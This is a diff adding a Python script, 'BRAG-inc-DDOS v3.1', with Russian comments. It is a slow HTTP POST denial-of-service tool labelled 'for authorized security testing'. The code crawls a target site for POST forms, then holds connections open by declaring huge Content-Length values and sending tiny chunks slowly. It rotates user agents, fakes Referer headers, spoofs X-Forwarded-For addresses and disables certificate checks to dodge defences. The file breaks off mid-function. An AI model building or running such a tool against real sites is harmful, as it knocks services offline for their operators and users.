@@ -1,0 +1,2134 @@
+#!/usr/bin/env python3
+"""
+╔══════════════════════════════════════════════════════════════════╗
+║                       BRAG-inc-DDOS v3.1                         ║
+║            Enhanced Slow HTTP POST Security Testing Tool         ║
+║                                                                  ║
+║         ██████╗ ██████╗  █████╗  ██████╗      ██╗███╗   ██╗ ██████╗║
+║         ██╔══██╗██╔══██╗██╔══██╗██╔════╝      ██║████╗  ██║██╔════╝║
+║         ██████╔╝██████╔╝███████║██║  ███╗     ██║██╔██╗ ██║██║     ║
+║         ██╔══██╗██╔══██╗██╔══██║██║   ██║     ██║██║╚██╗██║██║     ║
+║         ██████╔╝██║  ██║██║  ██║╚██████╔╝     ██╔╝██║ ╚████║╚██████║
+║         ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝      ╚═╝ ╚═╝  ╚═══╝ ╚═════╝║
+║                                                                  ║
+║              DDoS RESEARCH & SECURITY ASSESSMENT                 ║
+║                     BRAG-inc Security Team                       ║
+║                                                                  ║
+╚══════════════════════════════════════════════════════════════════╝
+
+FOR AUTHORIZED SECURITY TESTING ONLY
+
+███████╗███████╗ ██████╗██╗   ██╗██████╗ ███████╗██████╗ 
+██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗
+███████╗█████╗  ██║     ██║   ██║██████╔╝█████╗  ██████╔╝
+╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██╔══╝  ██╔══██╗
+███████║███████╗╚██████╗╚██████╔╝██║  ██║███████╗██║  ██║
+╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+"""
+import sys
+import os
+import socket
+import ssl
+import threading
+import time
+import random
+import re
+import argparse
+import logging
+from urllib.parse import urlparse, urljoin
+from http.client import HTTPConnection, HTTPSConnection
+from html.parser import HTMLParser
+from configparser import ConfigParser
+from datetime import datetime
+import json
+import hashlib
+import ipaddress
+from typing import Optional, List, Dict, Any, Tuple
+import select
+import struct
+
+# ============================================================================
+# ГЛОБАЛЬНЫЕ КОНСТАНТЫ И НАСТРОЙКИ
+# ============================================================================
+
+VERSION = "3.1.0"
+AUTHOR = "BRAG-inc Security Team"
+COPYRIGHT = "© 2025 BRAG-inc. Все права защищены"
+LICENSE = "PROPRIETARY - AUTHORIZED USE ONLY"
+
+# Настройка логирования с улучшенным форматированием
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s.%(msecs)03d - [%(levelname)s] - %(name)s - %(message)s',
+    datefmt='%Y-%m-%d %H:%M:%S',
+    handlers=[
+        logging.FileHandler(f'rudy_attack_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
+        logging.StreamHandler(sys.stdout)
+    ]
+)
+logger = logging.getLogger(__name__)
+
+# Дополнительные пользовательские агенты для большей рандомизации
+EXTENDED_USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0"
+]
+
+# Стандартные порты для HTTP/HTTPS
+STANDARD_PORTS = {
+    'http': 80,
+    'https': 443
+}
+
+# ============================================================================
+# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
+# ============================================================================
+
+def generate_session_id() -> str:
+    """Генерирует уникальный ID сессии"""
+    return hashlib.md5(f"{datetime.now().timestamp()}{random.random()}".encode()).hexdigest()[:16]
+
+def validate_ip_address(ip: str) -> bool:
+    """Проверяет валидность IP-адреса"""
+    try:
+        ipaddress.ip_address(ip)
+        return True
+    except ValueError:
+        return False
+
+def calculate_checksum(data: bytes) -> str:
+    """Вычисляет контрольную сумму данных"""
+    return hashlib.sha256(data).hexdigest()
+
+def format_bytes(size: int) -> str:
+    """Форматирует байты в читаемый вид"""
+    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
+        if size < 1024.0:
+            return f"{size:.2f} {unit}"
+        size /= 1024.0
+    return f"{size:.2f} PB"
+
+def get_random_referer() -> str:
+    """Генерирует случайный Referer header"""
+    referers = [
+        "https://www.google.com/",
+        "https://www.bing.com/",
+        "https://search.yahoo.com/",
+        "https://duckduckgo.com/",
+        "https://www.reddit.com/",
+        "https://news.ycombinator.com/",
+        "https://stackoverflow.com/",
+        "https://github.com/"
+    ]
+    return random.choice(referers)
+
+# ============================================================================
+# КЛАСС ПАРСЕРА HTML ФОРМ
+# ============================================================================
+
+class HTMLFormParser(HTMLParser):
+    """Парсер HTML для поиска форм с улучшенной обработкой и валидацией"""
+    
+    def __init__(self):
+        super().__init__()
+        self.forms: List[Dict[str, Any]] = []
+        self.current_form: Optional[Dict[str, Any]] = None
+        self.current_inputs: List[Dict[str, str]] = []
+        self.depth: int = 0
+        self.current_textarea_data: str = ""
+        self.in_textarea: bool = False
+        
+    def handle_starttag(self, tag: str, attrs: List[Tuple[str, Optional[str]]]) -> None:
+        """Обрабатывает открывающие теги"""
+        attrs_dict = dict(attrs)
+        
+        if tag.lower() == 'form':
+            self.current_form = {
+                'action': attrs_dict.get('action', ''),
+                'method': attrs_dict.get('method', 'get').lower(),
+                'id': attrs_dict.get('id', ''),
+                'name': attrs_dict.get('name', ''),
+                'class': attrs_dict.get('class', ''),
+                'enctype': attrs_dict.get('enctype', 'application/x-www-form-urlencoded'),
+                'target': attrs_dict.get('target', '_self'),
+                'inputs': []
+            }
+            self.depth += 1
+            
+        elif tag.lower() == 'input' and self.current_form:
+            input_type = attrs_dict.get('type', 'text').lower()
+            input_field = {
+                'name': attrs_dict.get('name', ''),
+                'type': input_type,
+                'value': attrs_dict.get('value', ''),
+                'placeholder': attrs_dict.get('placeholder', ''),
+                'required': 'required' in attrs_dict,
+                'disabled': 'disabled' in attrs_dict,
+                'readonly': 'readonly' in attrs_dict,
+                'maxlength': attrs_dict.get('maxlength', ''),
+                'size': attrs_dict.get('size', ''),
+                'pattern': attrs_dict.get('pattern', ''),
+                'title': attrs_dict.get('title', '')
+            }
+            
+            # Добавляем поле если у него есть имя или это специальный тип
+            if input_field['name'] or input_type in ['submit', 'button', 'image']:
+                self.current_form['inputs'].append(input_field)
+                
+        elif tag.lower() == 'textarea' and self.current_form:
+            self.in_textarea = True
+            self.current_textarea_data = ""
+            textarea_field = {
+                'name': attrs_dict.get('name', ''),
+                'type': 'textarea',
+                'value': '',
+                'placeholder': attrs_dict.get('placeholder', ''),
+                'required': 'required' in attrs_dict,
+                'disabled': 'disabled' in attrs_dict,
+                'readonly': 'readonly' in attrs_dict,
+                'rows': attrs_dict.get('rows', ''),
+                'cols': attrs_dict.get('cols', ''),
+                'maxlength': attrs_dict.get('maxlength', ''),
+                'wrap': attrs_dict.get('wrap', '')
+            }
+            if textarea_field['name']:
+                self.current_form['inputs'].append(textarea_field)
+                
+        elif tag.lower() == 'select' and self.current_form:
+            select_field = {
+                'name': attrs_dict.get('name', ''),
+                'type': 'select',
+                'value': '',
+                'multiple': 'multiple' in attrs_dict,
+                'required': 'required' in attrs_dict,
+                'disabled': 'disabled' in attrs_dict,
+                'size': attrs_dict.get('size', ''),
+                'options': []
+            }
+            if select_field['name']:
+                self.current_form['inputs'].append(select_field)
+                
+        elif tag.lower() == 'option' and self.current_form and self.current_form['inputs']:
+            last_input = self.current_form['inputs'][-1]
+            if last_input['type'] == 'select':
+                option = {
+                    'value': attrs_dict.get('value', ''),
+                    'text': '',
+                    'selected': 'selected' in attrs_dict,
+                    'disabled': 'disabled' in attrs_dict
+                }
+                last_input['options'].append(option)
+    
+    def handle_endtag(self, tag: str) -> None:
+        """Обрабатывает закрывающие теги"""
+        if tag.lower() == 'form' and self.current_form:
+            self.depth -= 1
+            if self.depth == 0:
+                if self.current_form['inputs']:
+                    self.forms.append(self.current_form)
+                self.current_form = None
+                
+        elif tag.lower() == 'textarea':
+            self.in_textarea = False
+            if self.current_form and self.current_form['inputs']:
+                for inp in self.current_form['inputs']:
+                    if inp['type'] == 'textarea' and not inp['value']:
+                        inp['value'] = self.current_textarea_data.strip()
+    
+    def handle_data(self, data: str) -> None:
+        """Обрабатывает текстовые данные"""
+        if self.in_textarea:
+            self.current_textarea_data += data
+        elif self.current_form and self.current_form['inputs']:
+            # Обработка текста внутри option
+            last_input = self.current_form['inputs'][-1]
+            if last_input['type'] == 'select' and last_input['options']:
+                last_option = last_input['options'][-1]
+                if not last_option['text']:
+                    last_option['text'] = data.strip()
+
+# ============================================================================
+# КЛАСС РАСШИРЕННОГО СКАНЕРА ЦЕЛЕЙ
+# ============================================================================
+
+class AdvancedTargetScanner:
+    """Улучшенный сканер цели с расширенными возможностями анализа"""
+    
+    def __init__(self, base_url: str, timeout: int = 15, max_redirects: int = 5):
+        self.base_url = base_url
+        self.parsed_url = urlparse(base_url)
+        self.timeout = timeout
+        self.max_redirects = max_redirects
+        self.forms: List[Dict[str, Any]] = []
+        self.discovered_pages = set()
+        self.session_cookies = {}
+        self.visited_urls = set()
+        self.robots_txt = None
+        self.sitemap_urls = []
+        self.session_id = generate_session_id()
+        logger.info(f"[SCANNER-{self.session_id}] Инициализация сканера для {base_url}")
+        
+    def create_connection(self, parsed_url: urlparse) -> HTTPConnection:
+        """Создает HTTP/HTTPS соединение с улучшенными настройками"""
+        if parsed_url.scheme == 'https':
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            # Дополнительные настройки SSL
+            context.options |= ssl.OP_NO_SSLv2
+            context.options |= ssl.OP_NO_SSLv3
+            context.options |= ssl.OP_NO_TLSv1
+            context.options |= ssl.OP_NO_TLSv1_1
+            
+            conn = HTTPSConnection(
+                parsed_url.netloc, 
+                timeout=self.timeout, 
+                context=context
+            )
+        else:
+            conn = HTTPConnection(parsed_url.netloc, timeout=self.timeout)
+        return conn
+    
+    def fetch_robots_txt(self) -> Optional[str]:
+        """Получает и анализирует robots.txt"""
+        try:
+            robots_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}/robots.txt"
+            conn = self.create_connection(urlparse(robots_url))
+            conn.request("GET", "/robots.txt", headers={
+                'User-Agent': 'BRAG-inc-DDOS-Scanner/3.1',
+                'Accept': 'text/plain'
+            })
+            response = conn.getresponse()
+            
+            if response.status == 200:
+                content = response.read().decode('utf-8', errors='ignore')
+                self.robots_txt = content
+                
+                # Извлекаем sitemap из robots.txt
+                for line in content.split('\n'):
+                    if line.lower().startswith('sitemap:'):
+                        sitemap_url = line.split(':', 1)[1].strip()
+                        if sitemap_url.startswith('http'):
+                            self.sitemap_urls.append(sitemap_url)
+                        else:
+                            self.sitemap_urls.append(f"{self.parsed_url.scheme}://{self.parsed_url.netloc}{sitemap_url}")
+                
+                logger.info(f"[SCANNER-{self.session_id}] robots.txt получен, найдено {len(self.sitemap_urls)} sitemap-ов")
+                return content
+        except Exception as e:
+            logger.debug(f"[SCANNER-{self.session_id}] Не удалось получить robots.txt: {e}")
+        return None
+    
+    def fetch_sitemap(self, sitemap_url: str) -> List[str]:
+        """Получает и парсит sitemap.xml"""
+        urls = []
+        try:
+            conn = self.create_connection(urlparse(sitemap_url))
+            conn.request("GET", urlparse(sitemap_url).path, headers={
+                'User-Agent': 'BRAG-inc-DDOS-Scanner/3.1',
+                'Accept': 'application/xml,text/xml'
+            })
+            response = conn.getresponse()
+            
+            if response.status == 200:
+                content = response.read().decode('utf-8', errors='ignore')
+                
+                # Простой парсинг sitemap
+                url_patterns = [
+                    r'<loc>\s*(https?://[^<]+)\s*</loc>',
+                    r'<url>\s*<loc>\s*(https?://[^<]+)\s*</loc>',
+                    r'<sitemap>\s*<loc>\s*(https?://[^<]+)\s*</loc>'
+                ]
+                
+                for pattern in url_patterns:
+                    matches = re.findall(pattern, content, re.IGNORECASE)
+                    for match in matches:
+                        if self.is_internal_link(match):
+                            urls.append(match)
+                
+                logger.info(f"[SCANNER-{self.session_id}] Sitemap {sitemap_url} обработан, найдено {len(urls)} URL-ов")
+        except Exception as e:
+            logger.debug(f"[SCANNER-{self.session_id}] Ошибка обработки sitemap {sitemap_url}: {e}")
+        
+        return urls
+    
+    def fetch_page(self, url: Optional[str] = None, method: str = 'GET', 
+                   follow_redirects: bool = True) -> Tuple[Optional[str], Optional[int], Dict[str, str]]:
+        """Получает HTML страницы с улучшенной обработкой и поддержкой редиректов"""
+        target_url = url or self.base_url
+        parsed = urlparse(target_url)
+        
+        try:
+            conn = self.create_connection(parsed)
+            
+            path = parsed.path or '/'
+            if parsed.query:
+                path += '?' + parsed.query
+            if parsed.fragment:
+                path += '#' + parsed.fragment
+            
+            headers = {
+                'User-Agent': random.choice(EXTENDED_USER_AGENTS),
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.5',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Connection': 'close',
+                'Upgrade-Insecure-Requests': '1',
+                'Cache-Control': 'no-cache',
+                'Pragma': 'no-cache',
+                'Referer': get_random_referer()
+            }
+            
+            if self.session_cookies:
+                headers['Cookie'] = '; '.join([f"{k}={v}" for k, v in self.session_cookies.items()])
+            
+            conn.request(method, path, headers=headers)
+            response = conn.getresponse()
+            
+            # Обработка cookies
+            if 'Set-Cookie' in response.headers:
+                cookie_header = response.headers['Set-Cookie']
+                cookies = re.findall(r'([^=]+)=([^;]+)', cookie_header)
+                for cookie_name, cookie_value in cookies:
+                    self.session_cookies[cookie_name] = cookie_value
+            
+            # Обработка редиректов
+            redirect_count = 0
+            while follow_redirects and response.status in [301, 302, 303, 307, 308] and redirect_count < self.max_redirects:
+                if 'Location' in response.headers:
+                    redirect_url = response.headers['Location']
+                    if not redirect_url.startswith(('http://', 'https://')):
+                        redirect_url = urljoin(f"{parsed.scheme}://{parsed.netloc}", redirect_url)
+                    
+                    logger.debug(f"[SCANNER-{self.session_id}] Редирект {redirect_count+1} на {redirect_url}")
+                    
+                    # Закрываем текущее соединение
+                    conn.close()
+                    
+                    # Создаем новое соединение для редиректа
+                    parsed = urlparse(redirect_url)
+                    conn = self.create_connection(parsed)
+                    
+                    path = parsed.path or '/'
+                    if parsed.query:
+                        path += '?' + parsed.query
+                    
+                    conn.request(method, path, headers=headers)
+                    response = conn.getresponse()
+                    redirect_count += 1
+                else:
+                    break
+            
+            html_content = response.read()
+            
+            # Декодирование контента с учетом кодировки
+            content_type = response.headers.get('Content-Type', '').lower()
+            charset = 'utf-8'  # кодировка по умолчанию
+            
+            if 'charset=' in content_type:
+                match = re.search(r'charset=([\w-]+)', content_type)
+                if match:
+                    charset = match.group(1)
+            
+            try:
+                html_content = html_content.decode(charset, errors='ignore')
+            except (UnicodeDecodeError, LookupError):
+                # Пробуем другие распространенные кодировки
+                for alt_charset in ['utf-8', 'iso-8859-1', 'windows-1251', 'cp1251']:
+                    try:
+                        html_content = html_content.decode(alt_charset, errors='ignore')
+                        break
+                    except:
+                        continue
+            
+            # Сбор метаданных ответа
+            response_headers = dict(response.headers)
+            
+            conn.close()
+            return html_content, response.status, response_headers
+            
+        except socket.timeout:
+            logger.warning(f"[SCANNER-{self.session_id}] Таймаут при запросе к {target_url}")
+            return None, None, {}
+        except Exception as e:
+            logger.error(f"[SCANNER-{self.session_id}] Ошибка при запросе к {target_url}: {e}")
+            return None, None, {}
+    
+    def extract_links(self, html_content: str, base_url: str) -> set:
+        """Извлекает ссылки со страницы с улучшенным парсингом"""
+        links = set()
+        
+        # Регулярные выражения для извлечения ссылок
+        patterns = [
+            r'href\s*=\s*["\']([^"\'>]+)["\']',
+            r'src\s*=\s*["\']([^"\'>]+)["\']',
+            r'action\s*=\s*["\']([^"\'>]+)["\']',
+            r'url\s*\(\s*["\']?([^"\'\)]+)["\']?\s*\)',
+            r'<meta[^>]*http-equiv\s*=\s*["\']refresh["\'][^>]*content\s*=\s*["\'][^"\'>]*url\s*=\s*([^"\'>]+)["\']',
+            r'<iframe[^>]*src\s*=\s*["\']([^"\'>]+)["\']',
+            r'<frame[^>]*src\s*=\s*["\']([^"\'>]+)["\']',
+            r'<embed[^>]*src\s*=\s*["\']([^"\'>]+)["\']',
+            r'<object[^>]*data\s*=\s*["\']([^"\'>]+)["\']',
+            r'<link[^>]*href\s*=\s*["\']([^"\'>]+)["\']'
+        ]
+        
+        for pattern in patterns:
+            found_links = re.findall(pattern, html_content, re.IGNORECASE)
+            for link in found_links:
+                # Очистка ссылки
+                link = link.strip()
+                if not link or link.startswith(('javascript:', 'mailto:', 'tel:', '#', 'data:')):
+                    continue
+                    
+                # Удаление якорей
+                if '#' in link:
+                    link = link.split('#')[0]
+                
+                full_url = urljoin(base_url, link)
+                
+                # Нормализация URL
+                parsed = urlparse(full_url)
+                if parsed.scheme not in ['http', 'https']:
+                    continue
+                
+                # Удаление стандартных портов
+                if (parsed.scheme == 'http' and parsed.port == 80) or \
+                   (parsed.scheme == 'https' and parsed.port == 443):
+                    netloc = parsed.netloc.split(':')[0]
+                    full_url = f"{parsed.scheme}://{netloc}{parsed.path}"
+                    if parsed.query:
+                        full_url += f"?{parsed.query}"
+                
+                if self.is_internal_link(full_url):
+                    links.add(full_url)
+        
+        return links
+    
+    def find_forms(self, html_content: str, page_url: str) -> List[Dict[str, Any]]:
+        """Находит все формы на странице с расширенной информацией"""
+        parser = HTMLFormParser()
+        parser.feed(html_content)
+        
+        forms = []
+        for form in parser.forms:
+            # Пропускаем формы не с методом POST
+            if form['method'] not in ['post', 'POST']:
+                continue
+                
+            # Нормализация URL действия
+            action = form['action']
+            if not action or action.strip() == '':
+                action = page_url
+            elif not action.startswith(('http://', 'https://')):
+                if action.startswith('/'):
+                    action = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}{action}"
+                else:
+                    action = urljoin(page_url, action)
+            
+            # Фильтрация полезных полей
+            useful_inputs = []
+            input_details = []
+            
+            for inp in form['inputs']:
+                if inp['type'] not in ['submit', 'button', 'reset', 'image'] and inp['name']:
+                    useful_inputs.append(inp['name'])
+                    input_details.append({
+                        'name': inp['name'],
+                        'type': inp['type'],
+                        'required': inp.get('required', False),
+                        'default_value': inp.get('value', ''),
+                        'placeholder': inp.get('placeholder', '')
+                    })
+            
+            if useful_inputs:
+                forms.append({
+                    'action': action,
+                    'method': form['method'].upper(),
+                    'inputs': useful_inputs,
+                    'input_details': input_details,
+                    'source_url': page_url,
+                    'id': form.get('id', ''),
+                    'name': form.get('name', ''),
+                    'class': form.get('class', ''),
+                    'enctype': form.get('enctype', ''),
+                    'target': form.get('target', ''),
+                    'scan_timestamp': datetime.now().isoformat()
+                })
+        
+        return forms
+    
+    def is_internal_link(self, url: str) -> bool:
+        """Проверяет, является ли ссылка внутренней с улучшенной логикой"""
+        try:
+            parsed = urlparse(url)
+            base_parsed = self.parsed_url
+            
+            # Проверка валидности URL
+            if not parsed.netloc:
+                return True  # Относительные ссылки считаются внутренними
+            
+            # Извлечение доменов
+            base_domain_parts = base_parsed.netloc.split(':')[0].split('.')
+            target_domain_parts = parsed.netloc.split(':')[0].split('.')
+            
+            # Определение основного домена (игнорируя www)
+            base_main_domain = '.'.join(base_domain_parts[-2:]) if len(base_domain_parts) >= 2 else '.'.join(base_domain_parts)
+            target_main_domain = '.'.join(target_domain_parts[-2:]) if len(target_domain_parts) >= 2 else '.'.join(target_domain_parts)
+            
+            if base_main_domain == target_main_domain:
+                # Исключение файлов с определенными расширениями
+                excluded_ext = [
+                    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.svg', '.webp', '.ico',
+                    '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
+                    '.zip', '.rar', '.7z', '.tar', '.gz',
+                    '.mp3', '.mp4', '.avi', '.mkv', '.mov',
+                    '.css', '.js', '.json', '.xml',
+                    '.woff', '.woff2', '.ttf', '.eot',
+                    '.exe', '.msi', '.dmg', '.pkg'
+                ]
+                
+                path_lower = parsed.path.lower()
+                if not any(path_lower.endswith(ext) for ext in excluded_ext):
+                    return True
+                    
+        except Exception as e:
+            logger.debug(f"[SCANNER-{self.session_id}] Ошибка проверки ссылки {url}: {e}")
+        
+        return False
+    
+    def scan_site(self, max_pages: int = 30, max_depth: int = 3, 
+                  use_sitemap: bool = True) -> List[Dict[str, Any]]:
+        """Сканирует сайт на наличие POST-форм с расширенными возможностями"""
+        logger.info(f"[SCANNER-{self.session_id}] Начало сканирования {self.base_url} "
+                   f"(макс. страниц: {max_pages}, глубина: {max_depth})")
+        
+        # Получение robots.txt и sitemap
+        if use_sitemap:
+            self.fetch_robots_txt()
+            
+            # Сбор URL из sitemap
+            sitemap_urls = []
+            for sitemap_url in self.sitemap_urls:
+                sitemap_urls.extend(self.fetch_sitemap(sitemap_url))
+            
+            # Добавляем URL из sitemap в очередь сканирования
+            to_scan = [(url, 0) for url in sitemap_urls[:max_pages//2]]
+        else:
+            to_scan = []
+        
+        # Добавляем основную страницу
+        to_scan.append((self.base_url, 0))
+        
+        scanned = set()
+        all_forms = []
+        page_count = 0
+        
+        while to_scan and len(scanned) < max_pages and page_count < max_pages:
+            url, depth = to_scan.pop(0)
+            
+            if url in scanned or depth > max_depth:
+                continue
+                
+            logger.info(f"[SCANNER-{self.session_id}] Сканирование страницы {page_count+1}/{max_pages}: {url} (глубина: {depth})")
+            scanned.add(url)
+            page_count += 1
+            
+            # Запрос страницы
+            html, status, headers = self.fetch_page(url)
+            
+            if html and status == 200:
+                # Поиск форм на странице
+                page_forms = self.find_forms(html, url)
+                all_forms.extend(page_forms)
+                
+                if page_forms:
+                    logger.debug(f"[SCANNER-{self.session_id}] На странице {url} найдено {len(page_forms)} форм")
+                
+                # Поиск ссылок для дальнейшего сканирования
+                if depth < max_depth:
+                    links = self.extract_links(html, url)
+                    new_links = 0
+                    
+                    for link in links:
+                        if link not in scanned and link not in [u for u, _ in to_scan]:
+                            to_scan.append((link, depth + 1))
+                            new_links += 1
+                    
+                    logger.debug(f"[SCANNER-{self.session_id}] Найдено {new_links} новых ссылок на странице {url}")
+            
+            # Адаптивная задержка между запросами
+            delay = random.uniform(0.8, 2.0)
+            time.sleep(delay)
+        
+        # Удаление дубликатов форм
+        unique_forms = []
+        seen = set()
+        
+        for form in all_forms:
+            # Создаем уникальный ключ на основе action и отсортированных полей
+            key = (form['action'], tuple(sorted(form['inputs'])))
+            if key not in seen:
+                seen.add(key)
+                unique_forms.append(form)
+        
+        # Сортировка форм по количеству полей (больше полей -> более интересные формы)
+        unique_forms.sort(key=lambda x: len(x['inputs']), reverse=True)
+        
+        logger.info(f"[SCANNER-{self.session_id}] Сканирование завершено. "
+                   f"Просканировано {page_count} страниц, найдено {len(unique_forms)} уникальных POST-форм")
+        
+        return unique_forms
+
+# ============================================================================
+# КЛАСС УЛУЧШЕННОГО МЕДЛЕННОГО POST-СОЕДИНЕНИЯ
+# ============================================================================
+
+class EnhancedSlowPostConnection:
+    """Улучшенное медленное POST-соединение с расширенными возможностями"""
+    
+    def __init__(self, target_url: str, form_action: str, post_param: str, 
+                 connection_id: int, config: Optional[Dict[str, Any]] = None):
+        self.target_url = target_url
+        self.form_action = form_action
+        self.post_param = post_param
+        self.connection_id = connection_id
+        self.config = config or {}
+        
+        parsed = urlparse(form_action)
+        self.host = parsed.hostname
+        self.port = parsed.port or (443 if parsed.scheme == 'https' else 80)
+        self.path = parsed.path or '/'
+        self.use_ssl = parsed.scheme == 'https'
+        
+        self.socket = None
+        self.running = False
+        self.bytes_sent = 0
+        self.start_time = None
+        self.packets_sent = 0
+        self.last_activity = None
+        self.connection_attempts = 0
+        self.max_connection_attempts = self.config.get('max_connection_attempts', 5)
+        self.session_id = generate_session_id()
+        
+        # Конфигурация атаки с значениями по умолчанию
+        self.chunk_size_min = self.config.get('chunk_min', 1)
+        self.chunk_size_max = self.config.get('chunk_max', 10)
+        self.delay_min = self.config.get('delay_min', 0.5)
+        self.delay_max = self.config.get('delay_max', 5.0)
+        self.content_length = self.config.get('content_length', random.randint(10000000, 50000000))
+        self.randomize_content_length = self.config.get('randomize_content_length', True)
+        
+        if self.randomize_content_length:
+            self.content_length = random.randint(
+                max(1000000, self.content_length // 2),
+                self.content_length * 2
+            )
+        
+        # Расширенные пользовательские агенты
+        self.user_agents = EXTENDED_USER_AGENTS
+        
+        # Пул случайных данных для отправки
+        self.data_pool = self._create_data_pool()
+        
+        logger.debug(f"[CONN-{self.connection_id}] Инициализация соединения к {self.host}:{self.port}")
+    
+    def _create_data_pool(self) -> List[str]:
+        """Создает пул случайных данных для отправки"""
+        pool = []
+        
+        # Различные типы данных для обфускации
+        data_types = [
+            # Случайные алфавитно-цифровые данные
+            lambda: ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') 
+                           for _ in range(random.randint(5, 50))),
+            
+            # Специальные символы
+            lambda: ''.join(random.choice('!@#$%^&*()_+-=[]{}|;:,.<>?') 
+                           for _ in range(random.randint(3, 20))),
+            
+            # URL-encoded данные
+            lambda: ''.join(f'%{random.randint(0, 255):02x}' 
+                           for _ in range(random.randint(2, 10))),
+            
+            # Base64-like данные
+            lambda: ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=') 
+                           for _ in range(random.randint(10, 30))),
+            
+            # Простые повторяющиеся данные
+            lambda: 'A' * random.randint(1, 100),
+            
+            # JSON-like данные
+            lambda: f'{{"key{random.randint(1, 100)}":"value{random.randint(1, 100)}"}}',
+            
+            # XML-like данные
+            lambda: f'<data{random.randint(1, 100)}>value{random.randint(1, 100)}</data{random.randint(1, 100)}>'
+        ]
+        
+        # Создаем пул из 1000 элементов
+        for _ in range(1000):
+            data_type = random.choice(data_types)
+            pool.append(data_type())
+        
+        return pool
+    
+    def create_secure_socket(self) -> Optional[socket.socket]:
+        """Создает безопасное SSL соединение с улучшенными настройками"""
+        try:
+            # Создаем обычный сокет с дополнительными опциями
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            sock.settimeout(15)
+            
+            # Попытка подключения
+            sock.connect((self.host, self.port))
+            self.connection_attempts += 1
+            
+            if self.use_ssl:
+                # Создаем SSL контекст с улучшенными настройками
+                context = ssl.create_default_context()
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
+                
+                # Дополнительные настройки безопасности
+                context.options |= ssl.OP_NO_SSLv2
+                context.options |= ssl.OP_NO_SSLv3
+                context.options |= ssl.OP_NO_TLSv1
+                context.options |= ssl.OP_NO_TLSv1_1
+                context.minimum_version = ssl.TLSVersion.TLSv1_2
+                
+                # Обертываем сокет в SSL
+                ssl_sock = context.wrap_socket(
+                    sock,
+                    server_hostname=self.host,
+                    do_handshake_on_connect=True
+                )
+                
+                # Получаем информацию о SSL соединении
+                cipher = ssl_sock.cipher()
+                if cipher:
+                    logger.debug(f"[CONN-{self.connection_id}] SSL соединение установлено: {cipher[0]} {cipher[1]} {cipher[2]}")
+                
+                return ssl_sock
+            
+            return sock
+            
+        except socket.timeout:
+            logger.warning(f"[CONN-{self.connection_id}] Таймаут при подключении к {self.host}:{self.port}")
+            return None
+        except ConnectionRefusedError:
+            logger.warning(f"[CONN-{self.connection_id}] Подключение отклонено {self.host}:{self.port}")
+            return None
+        except Exception as e:
+            logger.error(f"[CONN-{self.connection_id}] Ошибка создания сокета: {e}")
+            return None
+    
+    def generate_custom_headers(self) -> str:
+        """Генерирует кастомные HTTP-заголовки с расширенными возможностями"""
+        # Базовые заголовки
+        headers = [
+            f"POST {self.path} HTTP/1.1",
+            f"Host: {self.host}",
+            f"User-Agent: {random.choice(self.user_agents)}",
+            "Content-Type: application/x-www-form-urlencoded",
+            f"Content-Length: {self.content_length}",
+            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Accept-Language: en-US,en;q=0.5",
+            "Accept-Encoding: gzip, deflate, br",
+            "Connection: keep-alive",
+            "Cache-Control: no-cache",
+            "Pragma: no-cache",
+            f"Referer: {get_random_referer()}",
+            "Upgrade-Insecure-Requests: 1",
+            "Origin: " + ('https' if self.use_ssl else 'http') + f"://{self.host}"
+        ]
+        
+        # Дополнительные заголовки для обфускации
+        extra_headers = [
+            f"X-Forwarded-For: {'.'.join(str(random.randint(1, 255)) for _ in range(4))}",
